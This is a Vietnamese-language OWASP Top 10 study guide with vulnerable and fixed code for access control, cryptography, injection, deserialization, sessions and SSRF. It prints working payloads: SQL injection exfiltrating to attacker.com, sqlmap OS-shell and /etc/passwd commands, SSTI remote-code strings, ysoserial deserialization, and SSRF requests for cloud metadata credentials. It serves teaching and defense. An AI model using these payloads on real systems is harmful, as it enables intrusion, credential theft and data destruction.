# OWASP Top 10 Deep Dive

> Phương pháp: What – How – Why – Components – Compare – Trade-offs – Real-world – Ghi chú

---

## A01: Broken Access Control

### What – Broken Access Control là gì?
Khi ứng dụng không kiểm soát đúng quyền truy cập → user có thể xem/sửa data của người khác hoặc thực hiện hành động vượt quyền.

### How – IDOR (Insecure Direct Object Reference)

```http
# Vulnerable: dùng sequential ID, không check ownership
GET /api/v1/invoices/1001 HTTP/1.1
Authorization: Bearer user_A_token

# Attack: thay ID
GET /api/v1/invoices/1002 HTTP/1.1
Authorization: Bearer user_A_token
→ Nếu server trả về invoice của user B → IDOR

# Automated IDOR testing với Burp Intruder:
# 1. Bắt request GET /api/invoices/§1001§
# 2. Payload: numbers 1000-1200
# 3. Compare response sizes → tìm anomalies
```

```java
// Vulnerable code:
@GetMapping("/invoices/{id}")
public Invoice getInvoice(@PathVariable Long id) {
    return invoiceRepo.findById(id).orElseThrow();  // Không check ownership!
}

// Fixed:
@GetMapping("/invoices/{id}")
public Invoice getInvoice(@PathVariable Long id,
                           @AuthenticationPrincipal UserDetails user) {
    Invoice invoice = invoiceRepo.findById(id).orElseThrow();
    if (!invoice.getOwnerEmail().equals(user.getUsername())) {
        throw new AccessDeniedException("Not your invoice");
    }
    return invoice;
}

// Better: query filter by owner directly
@GetMapping("/invoices/{id}")
public Invoice getInvoice(@PathVariable Long id,
                           @AuthenticationPrincipal UserDetails user) {
    return invoiceRepo.findByIdAndOwnerEmail(id, user.getUsername())
        .orElseThrow(() -> new ResponseStatusException(HttpStatus.NOT_FOUND));
    // Không tìm thấy → 404 (không lộ là tồn tại nhưng không có quyền)
}
```

### How – Forced Browsing & Missing Function-Level Access Control

```http
# Admin panel không được link từ UI nhưng accessible
GET /admin/users HTTP/1.1
GET /admin/export-database HTTP/1.1
GET /api/v1/admin/reset-password?user=victim@email.com

# Horizontal vs Vertical Privilege Escalation:
# Horizontal: user A xem data của user B (same role)
# Vertical: user leo thang thành admin

# Testing:
# 1. Create 2 accounts: userA, userB
# 2. Log in userA, capture all API calls
# 3. Log in userB, replay userA's requests → check if accessible
```

### How – Mass Assignment

```javascript
// Vulnerable: bind all request fields vào model
// POST /api/users { "name": "John", "role": "admin" }
const user = await User.create(req.body);  // role được set thành admin!

// Fixed: whitelist allowed fields
const { name, email, password } = req.body;
const user = await User.create({ name, email, password });
// role không được set từ input

// Spring Boot:
// Dùng DTO pattern, không dùng @Entity trực tiếp trong controller input
@PostMapping("/users")
public User createUser(@RequestBody @Valid CreateUserDto dto) {
    // CreateUserDto chỉ có name, email, password - không có role
    return userService.create(dto);
}
```

---

## A02: Cryptographic Failures

### How – Password Storage

```python
# WRONG: MD5 hoặc SHA1 không có salt
import hashlib
hash = hashlib.md5(b"password123").hexdigest()
# → 482c811da5d5b4bc6d497ffa98491e38
# Có thể crack ngay bằng rainbow table / hashcat

# WRONG: SHA256 không có salt
hash = hashlib.sha256(b"password123").hexdigest()
# → vẫn deterministic, rainbow table attack

# CORRECT: bcrypt với work factor
import bcrypt
hashed = bcrypt.hashpw(b"password123", bcrypt.gensalt(rounds=12))
# rounds=12: ~200ms per check → brute force rất chậm

# BETTER: Argon2id (phòng chống GPU/FPGA attacks)
from argon2 import PasswordHasher
ph = PasswordHasher(time_cost=2, memory_cost=65536, parallelism=2)
hash = ph.hash("password123")
# memory_cost=64MB → cần nhiều RAM → không scale trên GPU

# Java Spring Security:
PasswordEncoder encoder = new BCryptPasswordEncoder(12);
String hash = encoder.encode(rawPassword);
boolean match = encoder.matches(rawPassword, hash);
```

### How – Sensitive Data Exposure

```java
// WRONG: log sensitive data
logger.info("User login: username={}, password={}", username, password);
logger.debug("Processing payment: card={}, cvv={}", cardNumber, cvv);

// WRONG: sensitive data in URL
GET /search?query=patient&ssn=123-45-6789
// → URL logged in web server access logs, browser history, Referer headers

// WRONG: store sensitive data in localStorage / sessionStorage
localStorage.setItem("authToken", token);  // XSS có thể đọc
// BETTER: HttpOnly cookie

// WRONG: PII in logs without masking
// CORRECT:
logger.info("User login: username={}", maskUsername(username));
String maskUsername(String u) {
    return u.substring(0, 2) + "***" + u.substring(u.indexOf('@'));
}

// TLS configuration (Spring Boot):
server:
  ssl:
    enabled: true
    protocol: TLSv1.2          # minimum TLS 1.2
    enabled-protocols: TLSv1.2,TLSv1.3
    ciphers: TLS_AES_128_GCM_SHA256,TLS_AES_256_GCM_SHA384
    key-store: classpath:keystore.p12
    key-store-password: ${SSL_KEYSTORE_PASSWORD}
```

---

## A03: Injection

### How – SQL Injection Types

```sql
-- 1. Classic (Error-based): extract data từ error messages
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version())))--
' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT database()), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a)--

-- 2. Union-based: append extra query
' ORDER BY 5--             # xác định số columns
' UNION SELECT null,null,null,null,null--
' UNION SELECT 1,2,database(),4,5--
' UNION SELECT 1,2,table_name,4,5 FROM information_schema.tables WHERE table_schema=database()--
' UNION SELECT 1,2,column_name,4,5 FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT 1,2,concat(username,':',password),4,5 FROM users--

-- 3. Blind Boolean-based: không có output, suy ra từ true/false response
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--
-- → nếu response khác → 'a' là ký tự đầu tiên của password

-- 4. Blind Time-based: suy ra từ thời gian response
'; IF (SELECT COUNT(*) FROM users WHERE username='admin')=1 WAITFOR DELAY '0:0:5'--
-- MySQL:
' AND SLEEP(5)--
-- PostgreSQL:
'; SELECT pg_sleep(5)--

-- 5. Out-of-band: exfiltrate qua DNS/HTTP
' EXEC master..xp_dirtree '//attacker.com/'+database()+'/'--   -- SQL Server
' UNION SELECT LOAD_FILE(concat('\\\\',database(),'.attacker.com\\x'))--   -- MySQL
```

```bash
# SQLMap advanced usage
# Detect WAF
sqlmap -u "http://target.com/item?id=1" --identify-waf

# Bypass WAF
sqlmap -u "http://target.com/item?id=1" --tamper=space2comment,between,randomcase

# GET OS shell (nếu có FILE privilege và INTO OUTFILE)
sqlmap -u "http://target.com/item?id=1" --os-shell

# Read local file
sqlmap -u "http://target.com/item?id=1" --file-read=/etc/passwd

# Dump specific columns
sqlmap -u "http://target.com/item?id=1" -D mydb -T users -C username,password --dump
```

### How – NoSQL Injection (MongoDB)

```javascript
// Vulnerable Express.js:
app.post('/login', async (req, res) => {
    const user = await User.findOne({
        username: req.body.username,
        password: req.body.password  // DANGEROUS!
    });
});

// Attack: JSON injection
// POST body: { "username": "admin", "password": {"$gt": ""} }
// MongoDB query: { username: "admin", password: { $gt: "" } }
// → password field > "" → true for any non-empty password → bypass auth!

// Other operators:
{ "password": { "$ne": null } }       // not equal null → any value
{ "password": { "$regex": "^a" } }    // regex brute force (time-based)
{ "username": { "$in": ["admin", "root", "administrator"] } }

// Fixed:
const user = await User.findOne({
    username: String(req.body.username),  // cast to string
    password: String(req.body.password)
});
// Hoặc dùng mongoose schema validation (type: String)
```

### How – SSTI (Server-Side Template Injection)

```python
# Vulnerable Python Flask:
@app.route('/hello')
def hello():
    name = request.args.get('name', 'World')
    template = f"<h1>Hello {name}!</h1>"
    return render_template_string(template)  # DANGEROUS!

# Attack: http://target.com/hello?name={{7*7}}
# → Output: <h1>Hello 49!</h1> → template injection confirmed

# RCE payload (Jinja2):
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
# Sandbox escape:
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

# Twig (PHP):
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# Freemarker (Java):
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }

# Thymeleaf (Spring MVC) - URL parameter trong template path:
# GET /path/(${T(java.lang.Runtime).getRuntime().exec('id')})
# → RCE nếu path được đưa vào template engine

# Phòng thủ:
# - KHÔNG dùng user input trong template string
# - Dùng template variables đúng cách: render_template('hello.html', name=name)
# - Sandbox template engine
```

---

## A04: Insecure Design

### How – Business Logic Vulnerabilities

```
Race Condition:
1. User A có $100 trong account
2. User A gửi 2 requests đồng thời: transfer $100 đến B, withdraw $100
3. Cả 2 đọc balance = $100 trước khi update
4. Cả 2 thành công → account thành -$100

Code ví dụ (Vulnerable):
if (user.balance >= amount) {        // Thread 1 và 2 đều pass check
    user.balance -= amount;          // Race condition!
    transfer.execute();
}

Fixed:
BEGIN TRANSACTION;
SELECT balance FROM accounts WHERE id = ? FOR UPDATE;  -- Locking row
-- check balance
UPDATE accounts SET balance = balance - ? WHERE id = ?;
COMMIT;

Hoặc dùng optimistic locking:
UPDATE accounts SET balance = balance - ?, version = version + 1
WHERE id = ? AND version = ? AND balance >= ?
-- Nếu affected rows = 0 → concurrent modification → retry

Negative Value Attack:
POST /api/transfer { "amount": -100 }
→ Transfer -100 = receive 100 → tăng balance

Price Tampering:
POST /api/checkout { "items": [{"id": 1, "price": 0.01}] }
→ Nếu server tin client price → mua $1000 hàng với $0.01

Phòng thủ:
- Luôn lấy price từ server/DB, không tin client
- Input validation: amount > 0
- Transaction với locking
- Idempotency keys để tránh duplicate requests
```

---

## A07: Identification and Authentication Failures

### How – Session Security

```python
# Session Fixation attack:
# 1. Attacker lấy unauthenticated session ID: SESSID=abc123
# 2. Gửi link cho victim: http://target.com/login?PHPSESSID=abc123
# 3. Victim login với session này
# 4. Attacker dùng SESSID=abc123 → đã authenticated!

# Fixed: luôn regenerate session sau login
# PHP:
session_regenerate_id(true);  // delete old session, create new

# Flask:
session.clear()
session['user_id'] = user.id

# Cookie Security Flags:
Set-Cookie: session=abc123;
  HttpOnly;     # JS không thể đọc → chống XSS steal
  Secure;       # chỉ gửi qua HTTPS
  SameSite=Strict;  # không gửi trong cross-site requests → chống CSRF
  Path=/;
  Max-Age=1800  # 30 phút timeout

# JWT Best Practices:
import jwt
import secrets

# Generate strong secret (không hardcode)
SECRET = secrets.token_hex(32)  # 256-bit random

# Short expiry + refresh token
access_token = jwt.encode(
    {"sub": user_id, "exp": datetime.utcnow() + timedelta(minutes=15)},
    SECRET, algorithm="HS256"
)
refresh_token = jwt.encode(
    {"sub": user_id, "exp": datetime.utcnow() + timedelta(days=30)},
    SECRET, algorithm="HS256"
)
# Lưu refresh_token trong DB để có thể revoke
```

### How – Multi-Factor Authentication

```python
# TOTP (Time-based One-Time Password) - RFC 6238
import pyotp

# Enrollment:
secret = pyotp.random_base32()  # lưu trong DB per user
totp = pyotp.TOTP(secret)
provisioning_uri = totp.provisioning_uri(
    name="user@example.com",
    issuer_name="MyApp"
)
# → QR code cho Google Authenticator / Authy

# Verification:
def verify_totp(user_secret, user_input):
    totp = pyotp.TOTP(user_secret)
    return totp.verify(user_input, valid_window=1)  # ±30 giây

# Bypass TOTP attacks:
# 1. SIM Swapping → intercept SMS OTP
# 2. Phishing → real-time OTP relay (evilginx2 / Modlishka)
# 3. TOTP token không expired → reuse trong window

# Phòng thủ TOTP bypass:
# - Dùng TOTP/HOTP, không SMS
# - Hardware keys (YubiKey, FIDO2/WebAuthn)
# - Track used tokens (không cho reuse trong same window)
```

---

## A08: Software and Data Integrity Failures

### How – Deserialization Attacks

```java
// Java Deserialization RCE:
// Vulnerable: deserialize untrusted data
ObjectInputStream ois = new ObjectInputStream(request.getInputStream());
Object obj = ois.readObject();  // DANGEROUS! Can execute code during deserialization

// Attack: ysoserial tool tạo malicious serialized payload
// java -jar ysoserial.jar CommonsCollections1 "id > /tmp/pwned" > payload.bin
// curl -X POST --data-binary @payload.bin http://target.com/api/process

// Java Gadget Chains:
// CommonsCollections (1-7), Spring, Groovy, JRE8
// → khi deserialize, invoke arbitrary method chain → command execution

// Phòng thủ:
// 1. Không deserialize từ untrusted sources
// 2. Dùng JSON/XML thay binary serialization
// 3. serialization filter (Java 9+):
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
    "java.lang.*;!*"  // chỉ allow java.lang classes
);
ois.setObjectInputFilter(filter);

// 4. Deserialization firewall / agent: SerialKiller, NotSoSerial

// PHP unserialize():
// class Evil { function __destruct() { system($this->cmd); } }
// Payload: O:4:"Evil":1:{s:3:"cmd";s:2:"id";}
// PHP POP chains → RCE
// Phòng thủ: JSON thay serialize(), allowed_classes=false
$data = unserialize($input, ["allowed_classes" => false]);
```

### How – Supply Chain Security

```bash
# Dependency audit
npm audit                          # Node.js
pip-audit                          # Python
mvn dependency-check:check         # Java (OWASP Dependency Check)
bundle audit                       # Ruby

# SBOM (Software Bill of Materials)
syft myapp:latest -o spdx-json > sbom.json   # từ Docker image
cyclonedx-py -o bom.json                      # Python project

# Verify package integrity
# npm: verify signature
npm audit signatures               # check registry signatures

# Python: verify hash
pip download requests==2.28.0 --no-deps
pip hash requests-2.28.0-py3-none-any.whl
# so sánh với PyPI known hash

# Renovate / Dependabot: auto PRs cho dependency updates
# .github/dependabot.yml:
version: 2
updates:
  - package-ecosystem: npm
    directory: /
    schedule:
      interval: weekly
    ignore:
      - dependency-name: "lodash"
        versions: ["4.x"]
```

---

## A09: Security Logging and Monitoring Failures

### How – Logging Best Practices

```java
// Ghi log mọi security events
@Aspect
@Component
public class SecurityAuditAspect {

    @AfterReturning(pointcut = "@annotation(Auditable)", returning = "result")
    public void auditSuccess(JoinPoint jp, Object result) {
        AuditEvent event = AuditEvent.builder()
            .timestamp(Instant.now())
            .userId(SecurityContextHolder.getContext()
                        .getAuthentication().getName())
            .action(jp.getSignature().getName())
            .resource(extractResourceId(jp.getArgs()))
            .ipAddress(getCurrentRequest().getRemoteAddr())
            .userAgent(getCurrentRequest().getHeader("User-Agent"))
            .outcome("SUCCESS")
            .build();
        auditRepo.save(event);
    }

    @AfterThrowing(pointcut = "@annotation(Auditable)", throwing = "ex")
    public void auditFailure(JoinPoint jp, Exception ex) {
        // Log failed attempts (login, access denied, etc.)
    }
}

// Security events cần log:
// - Login success/failure (với IP, timestamp)
// - Permission denied
// - Password changes
// - MFA enrollment/disabling
// - Admin actions
// - Data access (PII, sensitive records)
// - API rate limit exceeded
// - Invalid JWT / expired session

// Log format (JSON structured):
{
  "timestamp": "2026-05-06T10:23:45Z",
  "level": "WARN",
  "event": "AUTH_FAILURE",
  "userId": null,
  "username": "admin",
  "ipAddress": "1.2.3.4",
  "userAgent": "curl/7.81.0",
  "path": "/api/v1/login",
  "message": "Invalid credentials",
  "requestId": "req-abc-123"
}
```

---

## A10: Server-Side Request Forgery (SSRF)

### How – SSRF Attack Patterns

```python
# Vulnerable Flask app:
@app.route('/fetch')
def fetch_url():
    url = request.args.get('url')
    response = requests.get(url)        # SSRF!
    return response.text

# Attack vectors:
# 1. AWS IMDS (metadata service):
# http://169.254.169.254/latest/meta-data/iam/security-credentials/
# → trả về AWS credentials của EC2 instance role

# 2. GCP metadata:
# http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# Header cần: Metadata-Flavor: Google

# 3. Internal services:
# http://redis:6379/  (dùng Gopher protocol)
# gopher://redis:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a  → flush Redis!

# 4. AWS Lambda / ECS credentials:
# http://169.254.170.2/v2/credentials/<UUID>

# Bypass kỹ thuật:
# DNS rebinding: first resolve → public IP (pass filter), second → internal
# http://spoofed.attacker.com/ → resolve thành 127.0.0.1

# URL scheme bypass:
# file:///etc/passwd
# dict://127.0.0.1:6379/info   → Redis info
# gopher://127.0.0.1:25/smtp-commands  → SMTP injection

# IP encoding bypass:
# 0x7f000001     → 127.0.0.1
# 2130706433     → 127.0.0.1 (decimal)
# 0177.0.0.1     → 127.0.0.1 (octal)
# 127.1          → 127.0.0.1 (short form)

# Fixed:
import ipaddress
from urllib.parse import urlparse

ALLOWED_SCHEMES = ['http', 'https']
BLOCKED_RANGES = [
    ipaddress.ip_network('127.0.0.0/8'),
    ipaddress.ip_network('10.0.0.0/8'),
    ipaddress.ip_network('172.16.0.0/12'),
    ipaddress.ip_network('192.168.0.0/16'),
    ipaddress.ip_network('169.254.0.0/16'),   # IMDS
    ipaddress.ip_network('::1/128'),
]

def is_safe_url(url):
    parsed = urlparse(url)
    if parsed.scheme not in ALLOWED_SCHEMES:
        return False
    try:
        ip = ipaddress.ip_address(socket.gethostbyname(parsed.hostname))
        for blocked in BLOCKED_RANGES:
            if ip in blocked:
                return False
    except (socket.gaierror, ValueError):
        return False
    return True
```

---

### Compare – OWASP 2021 vs 2017

| 2021 | 2017 | Notable Changes |
|------|------|----------------|
| A01: Broken Access Control | A05 | Lên #1, phổ biến nhất |
| A02: Cryptographic Failures | A03 | Đổi tên (cũ: Sensitive Data Exposure) |
| A03: Injection | A01 | Xuống #3, XSS merged vào đây |
| A04: Insecure Design | NEW | Mới 2021 |
| A05: Security Misconfiguration | A06 | Bao gồm XXE cũ |
| A06: Vulnerable Components | A09 | |
| A07: Auth Failures | A02 | |
| A08: Integrity Failures | NEW | Mới 2021, bao gồm insecure deserialization |
| A09: Logging Failures | A10 | |
| A10: SSRF | NEW | Mới 2021 |

### Trade-offs
- Parameterized queries: hoàn toàn ngăn SQLi nhưng không dùng được cho dynamic table/column names; dùng whitelist cho những trường hợp đó
- Output encoding vs CSP: encoding ngăn XSS tức thì; CSP là defense-in-depth nhưng phức tạp để configure
- Strict deserialization filter: an toàn nhưng có thể break legacy integrations
- Rate limiting: ngăn brute force nhưng cần cẩn thận với shared IPs (NAT, VPN)

### Real-world Usage
```bash
# OWASP ZAP automated scan
docker run -t owasp/zap2docker-stable zap-baseline.py \
  -t https://staging.myapp.com \
  -J report.json \
  -r report.html

# Burp Suite Pro active scan (CI integration)
java -jar burpsuite_pro.jar --project-file=project.burp \
  --config-file=scan-config.json

# Nikto scan
nikto -h https://target.com -ssl -Format json -output nikto.json

# Semgrep SAST
semgrep --config=p/owasp-top-ten src/
```

### Ghi chú – Chủ đề tiếp theo
> Web Pentesting Deep – Burp Suite advanced workflow, CSRF sâu, WebSockets attacks, CORS misconfiguration
> API Security – GraphQL introspection, REST API mass assignment, JWT/OAuth 2.0 deep dive

---

*Cập nhật lần cuối: 2026-05-06*
